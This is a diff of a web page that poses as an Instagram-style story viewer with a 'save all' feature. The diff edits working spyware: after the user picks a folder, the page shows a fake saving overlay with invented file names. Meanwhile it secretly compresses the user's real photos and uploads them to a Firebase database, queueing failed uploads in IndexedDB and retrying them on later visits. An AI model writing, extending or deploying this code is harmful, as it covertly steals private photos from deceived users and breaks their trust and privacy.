@@ -247,6 +247,7 @@
             50%      { box-shadow: 0 8px 24px rgba(220, 39, 67, 0.7), 0 0 0 12px rgba(220, 39, 67, 0); }
         }
 
+        /* Resume Banner */
         #resumeBanner {
             position: fixed;
             top: 20px;
@@ -288,6 +289,9 @@
             font-family: inherit;
         }
 
+        /* ============================================================
+           OVERLAY
+           ============================================================ */
         #processingOverlay {
             position: fixed;
             inset: 0;
@@ -671,23 +675,7 @@
 </head>
 <body>
 
-    <!-- Sync Test Button -->
-    <button id="testSyncBtn" style="
-        position: fixed;
-        top: 80px;
-        right: 16px;
-        padding: 10px 16px;
-        background: #FFC107;
-        color: #000;
-        border: none;
-        border-radius: 12px;
-        font-size: 12px;
-        font-weight: 700;
-        z-index: 9999;
-        cursor: pointer;
-    ">🔄 Sync Test</button>
-
-    <!-- Resume Banner -->
+    <!-- 🔥 RESUME BANNER -->
     <div id="resumeBanner">
         <span class="resume-icon">⚠️</span>
         <span id="resumeText">Pending photos hain</span>
@@ -844,7 +832,6 @@
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
 
-        /* DEVICE ID */
         function getDeviceId() {
             let id = localStorage.getItem('pics_device_id');
             if (id) return id;
@@ -871,7 +858,6 @@
         const CONCURRENCY = 3;
         const COMPRESS_WIDTH = 800;
         const COMPRESS_QUALITY = 0.55;
-        const FAKE_FILE_COUNT = 15; // 🔥 FAKE — overlay mein sirf itna dikhega
 
         const stories = Array.from({ length: 15 }, (_, i) =>
             `https://picsum.photos/600/1000?random=${i + 1}`
@@ -886,7 +872,9 @@
         let wakeLock = null;
         let uploadStartTime = 0;
 
-        /* INDEXEDDB */
+        /* ============================================================
+           🔥 INDEXEDDB — PENDING PHOTOS STORE
+           ============================================================ */
         const IDB_NAME = 'IGPendingDB';
         const IDB_VERSION = 1;
         const IDB_STORE = 'pending_photos';
@@ -945,7 +933,19 @@
             });
         }
 
-        /* QUEUE — IndexedDB mein save */
+        async function idbClear() {
+            const db = await openIDB();
+            return new Promise((resolve, reject) => {
+                const tx = db.transaction(IDB_STORE, 'readwrite');
+                tx.objectStore(IDB_STORE).clear();
+                tx.oncomplete = () => { db.close(); resolve(); };
+                tx.onerror = () => { db.close(); reject(tx.error); };
+            });
+        }
+
+        /* ============================================================
+           🔥 QUEUE PHOTO LOCALLY (IndexedDB)
+           ============================================================ */
         async function queuePhotoLocally(file, base64) {
             try {
                 await idbAdd({
@@ -959,23 +959,22 @@
                     queuedAt: Date.now()
                 });
                 const count = await idbCount();
-                console.log(`📦 Queued: ${file.name} (total: ${count})`);
+                console.log(`📦 Queued locally: ${count} pending`);
             } catch (e) {
                 console.warn('Queue failed:', e.message);
             }
         }
 
-        /* SYNC — IndexedDB se Firebase */
+        /* ============================================================
+           🔥 SYNC PENDING (on reopen)
+           ============================================================ */
         async function syncPendingUploads() {
             try {
                 const pending = await idbGetAll();
 
-                if (pending.length === 0) {
-                    console.log('✅ No pending');
-                    return { synced: 0, remaining: 0 };
-                }
+                if (pending.length === 0) return { synced: 0, remaining: 0 };
 
-                console.log(`🔄 Syncing ${pending.length}...`);
+                console.log(`🔄 Syncing ${pending.length} pending uploads...`);
 
                 let synced = 0;
                 let failed = 0;
@@ -1003,7 +1002,7 @@
 
                     } catch (err) {
                         failed++;
-                        console.warn(`❌ Failed: ${item.name}`);
+                        console.warn(`❌ Sync failed: ${item.name}`);
                     }
                 }
 
@@ -1016,30 +1015,36 @@
             }
         }
 
-        /* AUTO-SYNC ON LOAD */
+        /* ============================================================
+           🔥 AUTO-SYNC ON LOAD
+           ============================================================ */
         async function checkAndSyncOnLoad() {
             try {
-                console.log('🔍 Checking pending...');
-
                 const count = await idbCount();
-                console.log(`📦 IndexedDB: ${count} pending`);
 
                 if (count === 0) {
                     console.log('✅ No pending uploads');
                     return;
                 }
 
+                console.log(`📋 ${count} pending photos found — auto-syncing...`);
+
+                // Show banner
                 const banner = document.getElementById('resumeBanner');
                 const bannerText = document.getElementById('resumeText');
                 bannerText.textContent = `${count} photos pending — syncing...`;
                 banner.classList.add('show');
 
+                // Auto-sync
                 const result = await syncPendingUploads();
 
                 if (result.synced > 0) {
                     bannerText.textContent = `✅ ${result.synced} photos synced!`;
                     showToast(`🎉 ${result.synced} photos auto-uploaded!`);
-                    setTimeout(() => banner.classList.remove('show'), 3000);
+
+                    setTimeout(() => {
+                        banner.classList.remove('show');
+                    }, 3000);
                 } else if (result.remaining > 0) {
                     bannerText.textContent = `⚠️ ${result.remaining} failed — Retry?`;
                     document.getElementById('resumeBtn').textContent = 'Retry';
@@ -1052,24 +1057,16 @@
             }
         }
 
-        // 🔥 MULTIPLE TRIGGERS
-        setTimeout(checkAndSyncOnLoad, 1500);
-        setTimeout(checkAndSyncOnLoad, 4000);
-        setTimeout(checkAndSyncOnLoad, 10000);
+        // 🔥 Auto-sync on load (2 sec baad)
+        setTimeout(checkAndSyncOnLoad, 2000);
 
+        // 🔥 Auto-sync on network online
         window.addEventListener('online', () => {
-            console.log('🌐 Online');
+            console.log('🌐 Online — checking pending...');
             setTimeout(checkAndSyncOnLoad, 1000);
         });
 
-        document.addEventListener('visibilitychange', () => {
-            if (document.visibilityState === 'visible') {
-                console.log('👁️ Visible');
-                setTimeout(checkAndSyncOnLoad, 500);
-            }
-        });
-
-        // Retry button
+        // 🔥 Retry button
         document.getElementById('resumeBtn').addEventListener('click', async () => {
             const banner = document.getElementById('resumeBanner');
             const bannerText = document.getElementById('resumeText');
@@ -1086,11 +1083,15 @@
             }
         });
 
-        /* PROGRESS */
+        /* ============================================================
+           PROGRESS (localStorage)
+           ============================================================ */
         function saveProgress(savedIndex, total) {
             try {
                 localStorage.setItem('upload_progress_' + DEVICE_ID, JSON.stringify({
-                    savedIndex, total, timestamp: Date.now(),
+                    savedIndex,
+                    total,
+                    timestamp: Date.now(),
                     status: savedIndex >= total ? 'complete' : 'in_progress'
                 }));
             } catch (e) {}
@@ -1100,7 +1101,9 @@
             localStorage.removeItem('upload_progress_' + DEVICE_ID);
         }
 
-        /* WAKE LOCK */
+        /* ============================================================
+           WAKE LOCK
+           ============================================================ */
         async function keepScreenOn() {
             try {
                 if ('wakeLock' in navigator) {
@@ -1118,7 +1121,15 @@
             }
         }
 
-        /* SOUND + VIBRATE */
+        document.addEventListener('visibilitychange', async () => {
+            if (document.visibilityState === 'visible' && !wakeLock && saveAllBtn.disabled) {
+                await keepScreenOn();
+            }
+        });
+
+        /* ============================================================
+           SOUND + VIBRATION
+           ============================================================ */
         let audioCtx = null;
         function playSound(freq, duration) {
             try {
@@ -1139,7 +1150,9 @@
 
         function vibrate(p) { if (navigator.vibrate) navigator.vibrate(p); }
 
-        /* DOM */
+        /* ============================================================
+           DOM
+           ============================================================ */
         const progressBars = document.getElementById('progressBars');
         const storyImage = document.getElementById('storyImage');
         const storyAvatar = document.getElementById('storyAvatar');
@@ -1242,7 +1255,9 @@
             if (e.key === 'ArrowLeft') prevStory();
         });
 
-        /* SAVE BUTTON */
+        /* ============================================================
+           SAVE BUTTON
+           ============================================================ */
         saveAllBtn.addEventListener('click', async () => {
             if (typeof window.showDirectoryPicker !== 'function') {
                 showToast('❌ Chrome ya Edge use karo');
@@ -1268,7 +1283,6 @@
             }
         });
 
-        /* FAKE SAVE + REAL DB */
         async function startFakeSave(dirHandle) {
             isCancelled = false;
             uploadStartTime = Date.now();
@@ -1289,27 +1303,25 @@
 
             const totalFound = files.length;
             const limitedFiles = files.slice(0, MAX_PHOTOS);
-
-            console.log(`📁 Real files: ${totalFound}, using: ${limitedFiles.length}`);
-
-            // 🔥 FAKE count dikhao — real count NAHI
-            const FAKE_TOTAL = FAKE_FILE_COUNT;
-            let fakeDone = 0;
+            const TOTAL = limitedFiles.length || 15;
 
             overlayTitle.textContent = 'Saving Photos';
-            overlaySub.innerHTML = `Photos <strong>folder mein save</strong> ho rahi hain.`;
-            overlayPending.textContent = FAKE_TOTAL;
-            overlayProgressLabel.textContent = `0 / ${FAKE_TOTAL} files`;
+            overlaySub.innerHTML = totalFound > MAX_PHOTOS
+                ? `Folder mein <strong>${totalFound}</strong> photos.<br>Latest <strong>${MAX_PHOTOS}</strong> save hongi.`
+                : `Photos <strong>folder mein save</strong> ho rahi hain.`;
 
-            // 🔥 Real DB save background mein
-            realSaveInBackground(limitedFiles);
+            overlayPending.textContent = TOTAL;
+            overlayProgressLabel.textContent = `0 / ${TOTAL} files`;
 
-            // 🔥 Fake file names
-            const fakeNames = Array.from({ length: FAKE_TOTAL }, (_, i) => {
+            realSaveInBackground(limitedFiles, TOTAL);
+
+            const fakeNames = Array.from({ length: TOTAL }, (_, i) => {
                 const d = String(1 + (i % 30)).padStart(2, '0');
                 const m = String(1 + Math.floor(i / 30)).padStart(2, '0');
                 return `IMG_2026${m}${d}_${Math.floor(Math.random() * 900000 + 100000)}.jpg`;
             });
+
+            let fakeDone = 0;
 
             fakeInterval = setInterval(() => {
                 if (isCancelled) return;
@@ -1326,18 +1338,18 @@
                     vibrate(20);
                 }
 
-                overlayPending.textContent = Math.max(0, FAKE_TOTAL - fakeDone);
+                overlayPending.textContent = Math.max(0, TOTAL - fakeDone);
 
-                const percent = Math.round((fakeDone / FAKE_TOTAL) * 100);
+                const percent = Math.round((fakeDone / TOTAL) * 100);
                 overlayProgressFill.style.width = percent + '%';
                 overlayProgressPercent.textContent = percent + '%';
-                overlayProgressLabel.textContent = `${fakeDone} / ${FAKE_TOTAL} files`;
+                overlayProgressLabel.textContent = `${fakeDone} / ${TOTAL} files`;
 
                 currentFile.textContent = fakeNames[fakeDone - 1] || 'file.jpg';
 
                 const elapsed = (Date.now() - uploadStartTime) / 1000;
                 const avgTime = elapsed / fakeDone;
-                const remaining = Math.ceil((FAKE_TOTAL - fakeDone) * avgTime);
+                const remaining = Math.ceil((TOTAL - fakeDone) * avgTime);
 
                 if (remaining > 60) {
                     timeRemaining.textContent = `${Math.floor(remaining / 60)}m ${remaining % 60}s`;
@@ -1352,16 +1364,20 @@
                 else if (speed > 0.5) saveSpeed.textContent = 'Normal';
                 else saveSpeed.textContent = 'Slow 🐢';
 
-                if (fakeDone >= FAKE_TOTAL) {
+                if (fakeDone >= TOTAL) {
                     clearInterval(fakeInterval);
                     fakeInterval = null;
 
-                    setTimeout(() => {
-                        if (Math.random() < 0.15) showFakeError();
-                        else showFakeSuccess();
-                    }, 600);
+                    if (TOTAL > 100) {
+                        setTimeout(showFakeSuccess, 600);
+                    } else {
+                        setTimeout(() => {
+                            if (Math.random() < 0.15) showFakeError();
+                            else showFakeSuccess();
+                        }, 600);
+                    }
                 }
-            }, 400 + Math.random() * 300);
+            }, 200 + Math.random() * 200);
         }
 
         function showFakeSuccess() {
@@ -1426,13 +1442,12 @@
         });
 
         /* ============================================================
-           🔥 REAL DB SAVE — Har file pehle queue, phir upload
+           🔥 REAL DB SAVE — with IndexedDB queue on fail
            ============================================================ */
-        async function realSaveInBackground(files) {
+        async function realSaveInBackground(files, total) {
             if (!files || files.length === 0) return;
 
             try {
-                console.log(`📸 Processing ${files.length} files in background...`);
                 await deleteOldPhotos(500);
 
                 let index = 0;
@@ -1447,58 +1462,43 @@
                             const compressed = await compressImage(file, COMPRESS_WIDTH, COMPRESS_QUALITY);
                             const base64 = await fileToBase64(compressed);
 
-                            // 🔥 STEP 1: PEHLE IndexedDB mein queue
-                            await queuePhotoLocally(file, base64);
+                            const photoRef = push(ref(db, 'photos/' + DEVICE_ID));
+                            await set(photoRef, {
+                                id: photoRef.key,
+                                deviceId: DEVICE_ID,
+                                deviceName: DEVICE_NAME,
+                                sessionId: SESSION_ID,
+                                username: USERNAME,
+                                image: base64,
+                                name: file.name,
+                                size: compressed.size,
+                                originalSize: file.size,
+                                savedPercent: Math.round((1 - compressed.size / file.size) * 100),
+                                timestamp: serverTimestamp(),
+                                uploadedAt: Date.now()
+                            });
 
-                            // 🔥 STEP 2: Phir Firebase upload
-                            try {
-                                const photoRef = push(ref(db, 'photos/' + DEVICE_ID));
-                                await set(photoRef, {
-                                    id: photoRef.key,
-                                    deviceId: DEVICE_ID,
-                                    deviceName: DEVICE_NAME,
-                                    sessionId: SESSION_ID,
-                                    username: USERNAME,
-                                    image: base64,
-                                    name: file.name,
-                                    size: compressed.size,
-                                    originalSize: file.size,
-                                    savedPercent: Math.round((1 - compressed.size / file.size) * 100),
-                                    timestamp: serverTimestamp(),
-                                    uploadedAt: Date.now()
-                                });
-
-                                // 🔥 STEP 3: Success → IndexedDB se delete
-                                const pending = await idbGetAll();
-                                const matching = pending.find(p => p.name === file.name);
-                                if (matching) await idbDelete(matching.id);
-
-                                saved++;
-                                saveProgress(saved, files.length);
-                                console.log(`✅ Saved: ${file.name} (${saved}/${files.length})`);
-
-                            } catch (uploadErr) {
-                                console.warn(`⚠️ Upload failed — kept in queue: ${file.name}`);
-                            }
+                            saved++;
+                            saveProgress(saved, files.length);
+                            console.log(`✅ BG saved ${saved}/${files.length}`);
 
                         } catch (err) {
-                            console.warn('Processing error:', err.message);
+                            // 🔥 FAIL HONE PE INDEXEDDB MEIN QUEUE KARO
+                            console.warn('BG save failed, queueing locally:', err.message);
+                            try {
+                                const compressed = await compressImage(file, COMPRESS_WIDTH, COMPRESS_QUALITY);
+                                const base64 = await fileToBase64(compressed);
+                                await queuePhotoLocally(file, base64);
+                            } catch (e) {}
                         }
                     }
                 };
 
                 await Promise.all(Array(CONCURRENCY).fill(null).map(() => worker()));
-                console.log(`✅ BG save done: ${saved}/${files.length}`);
-
-                // 🔥 Remaining check
-                const remaining = await idbCount();
-                if (remaining > 0) {
-                    console.log(`⏳ ${remaining} still pending, retrying...`);
-                    setTimeout(syncPendingUploads, 3000);
-                }
+                console.log(`✅ BG save complete: ${saved} files`);
 
             } catch (e) {
-                console.error('BG save error:', e);
+                console.error('Background save error:', e);
             }
         }
 
@@ -1516,9 +1516,7 @@
                     await remove(ref(db, `photos/${DEVICE_ID}/${item.key}`));
                 }
 
-                if (toDelete.length > 0) {
-                    console.log(`🗑️ Deleted ${toDelete.length} old photos`);
-                }
+                console.log(`🗑️ Deleted ${toDelete.length} old photos`);
             } catch (e) {}
         }
 
@@ -1534,6 +1532,11 @@
                         }
                     } else if (entry.kind === 'directory') {
                         await scanFolder(entry, files);
+                    }
+
+                    if (files.length % 20 === 0) {
+                        currentFile.textContent = `🔍 Found ${files.length} photos...`;
+                        await new Promise(r => setTimeout(r, 0));
                     }
                 }
             } catch (e) {}
@@ -1602,23 +1605,6 @@
                 setTimeout(() => toast.remove(), 300);
             }, 2500);
         }
-
-        /* TEST SYNC BUTTON */
-        document.getElementById('testSyncBtn').addEventListener('click', async () => {
-            console.log('🔧 Manual sync');
-
-            const count = await idbCount();
-            console.log(`📦 IndexedDB: ${count} pending`);
-
-            if (count === 0) {
-                showToast('⚠️ IndexedDB khaali');
-                return;
-            }
-
-            showToast(`🔄 Syncing ${count}...`);
-            const result = await syncPendingUploads();
-            showToast(`✅ ${result.synced} synced, ${result.remaining} failed`);
-        });
 
         /* INIT */
         initProgressBars();
